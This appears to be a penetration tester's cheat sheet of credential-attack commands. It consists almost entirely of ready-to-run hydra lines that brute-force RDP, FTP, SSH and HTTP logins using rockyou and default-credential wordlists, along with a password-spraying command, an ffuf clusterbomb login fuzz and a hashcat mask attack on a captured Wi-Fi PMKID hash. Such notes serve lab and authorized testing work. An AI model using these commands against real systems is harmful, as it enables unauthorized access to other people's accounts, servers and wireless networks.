Always try username as password
Always try reverted-username as password

# Brute forcing RDP with hydra

```bash
hydra -l user -P rockyou.txt rdp://192.168.50.202
```

---

# Brute forcing FTP with hydra

```bash
hydra -l itadmin -I -P rockyou.txt -s 21 ftp://192.168.247.202
hydra -s 24621 -C /usr/share/wordlists/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -u -f 192.168.200.226 ftp
```

---

# Brute forcing SSH with hydra

```bash
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```

---

# Brute forcing HTTP POST login with hydra and FUFF

```bash
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
hydra -I -f -L wordlist.txt -P wordlist.txt 'http-post-form://192.168.159.61:8081/service/rapture/session:username=^USER64^&password=^PASS64^:C=/:F=403'

# Grab request from burp and change username with USERFUZZ and password with PASSFUZZ
ffuf -request request.txt -request-proto http -mode clusterbomb -w users.txt:USERFUZZ -w passwords.txt:PASSFUZZ -mc 200
```

---

# Brute forcing HTTP GET login with hydra

```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.244.191 http-get /
```

---

# Password spraying RDP with hydra

```bash
hydra -L users.txt -p "SuperS3cure1337#" rdp://192.168.247.202
```

---

# Hashcat bruteforcing

    ?l = abcdefghijklmnopqrstuvwxyz
    ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
    ?d = 0123456789
    ?h = 0123456789abcdef
    ?H = 0123456789ABCDEF
    ?s = «space»!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
    ?a = ?l?u?d?s
    ?b = 0x00 - 0xff

hashcat -m 22000 -a 3 pmkid_H369AAAEBF4_88-D2-74-AA-EB-F4_2024-01-01T16-00-05.22000 ?l?l?l?l?l?l?l --force
